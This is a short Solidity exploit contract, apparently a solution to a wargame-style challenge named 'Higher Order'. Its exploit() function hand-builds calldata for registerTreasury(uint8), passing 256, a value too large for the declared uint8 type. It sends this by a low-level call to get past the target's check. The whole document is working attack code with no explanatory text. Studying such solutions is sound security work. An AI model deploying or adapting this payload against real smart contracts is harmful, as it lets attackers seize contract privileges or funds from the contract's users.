pragma solidity ^0.6.12;

contract AttackHigherOrder {
    address public immutable instance;

    constructor(address _instance) public {
        instance = _instance;
    }

    function exploit() external {
        // Correct selector for registerTreasury(uint8) is 0xab3bfe6a
        bytes memory payload = abi.encodePacked(
            bytes4(0xab3bfe6a), 
            hex'0000000000000000000000000000000000000000000000000000000000000100'
        );
        (bool success, ) = instance.call{gas: 100000}(payload);
        require(success, "Exploit failed");
    }
}